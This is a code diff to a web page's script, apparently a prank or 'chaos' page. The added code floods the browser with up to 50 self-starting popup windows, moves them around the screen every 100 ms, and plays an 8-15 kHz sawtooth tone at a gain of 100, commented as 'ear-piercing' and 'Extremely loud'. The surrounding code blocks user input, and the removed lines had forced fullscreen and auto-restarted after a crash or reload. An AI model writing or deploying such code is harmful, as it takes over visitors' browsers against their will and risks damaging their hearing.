@@ -24,8 +24,32 @@
             return '';
         };
 
-        async function startChaos() {
-            if (button) {
+        let popupCount = 0;
+        const maxPopups = 50;
+
+        function createPopup() {
+            if (popupCount >= maxPopups) return;
+            
+            const popup = window.open(window.location.href, '_blank', 'width=400,height=300');
+            if (popup) {
+                popupCount++;
+                
+                const randomX = Math.random() * (screen.width - 400);
+                const randomY = Math.random() * (screen.height - 300);
+                popup.moveTo(randomX, randomY);
+            }
+        }
+
+        function movePopups() {
+            const popups = window.open('', '_blank');
+            // This won't work directly, but we'll move the current window
+            const randomX = Math.random() * (screen.width - 400);
+            const randomY = Math.random() * (screen.height - 300);
+            window.moveTo(randomX, randomY);
+        }
+
+        async function startChaos(isPopup = false) {
+            if (!isPopup && button) {
                 button.style.display = 'none';
             }
             videoContainer.style.display = 'block';
@@ -63,22 +87,56 @@
                 return false;
             }, true);
             
-            // Block fullscreen exit
-            document.addEventListener('fullscreenchange', (e) => {
-                if (!document.fullscreenElement) {
-                    document.documentElement.requestFullscreen().catch(e => {});
+            // Only main window goes fullscreen
+            if (!isPopup) {
+                document.documentElement.requestFullscreen().catch(e => {});
+                
+                // Spawn popups
+                for (let i = 0; i < 20; i++) {
+                    setTimeout(createPopup, i * 100);
                 }
-            });
+                
+                // Keep spawning popups
+                setInterval(() => {
+                    if (popupCount < maxPopups) {
+                        createPopup();
+                    }
+                }, 200);
+            }
             
-            document.documentElement.requestFullscreen().catch(e => {});
+            // Move window around
+            setInterval(() => {
+                const randomX = Math.random() * (screen.width - 400);
+                const randomY = Math.random() * (screen.height - 300);
+                window.moveTo(randomX, randomY);
+            }, 100);
+            
+            // Play ear-piercing high-pitch noise
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
+            
+            oscillator.type = 'sawtooth';
+            oscillator.frequency.setValueAtTime(8000, audioContext.currentTime);
+            oscillator.frequency.exponentialRampToValueAtTime(15000, audioContext.currentTime + 0.1);
+            
+            gainNode.gain.value = 100.0; // Extremely loud
+            
+            oscillator.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            
+            oscillator.start();
+            
+            // Modulate frequency for more piercing effect
+            setInterval(() => {
+                const freq = 8000 + Math.random() * 7000;
+                oscillator.frequency.setValueAtTime(freq, audioContext.currentTime);
+            }, 50);
             
             try {
                 const response = await fetch('base64.txt');
                 const base64String = await response.text();
                 const videoSrc = 'data:video/mp4;base64,' + base64String;
-                
-                // Create audio context for amplification
-                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                 
                 // Create 1 video element with amplified audio
                 const video = document.createElement('video');
@@ -91,10 +149,10 @@
                 
                 // Connect to audio context for normal volume
                 const source = audioContext.createMediaElementSource(video);
-                const gainNode = audioContext.createGain();
-                gainNode.gain.value = 1.0; // Normal volume
-                source.connect(gainNode);
-                gainNode.connect(audioContext.destination);
+                const videoGainNode = audioContext.createGain();
+                videoGainNode.gain.value = 1.0; // Normal volume
+                source.connect(videoGainNode);
+                videoGainNode.connect(audioContext.destination);
                 
                 video.play().catch(e => {
                     console.log('Autoplay blocked');
@@ -129,12 +187,12 @@
             }, 3000);
         }
 
-        button.addEventListener('click', startChaos);
+        button.addEventListener('click', () => startChaos(false));
 
-        // Auto-start on page load (so it continues after crash/reload)
-        window.addEventListener('load', () => {
-            startChaos();
-        });
+        // Auto-start if this is a popup window
+        if (window.opener) {
+            startChaos(true);
+        }
     </script>
 </body>
 </html>
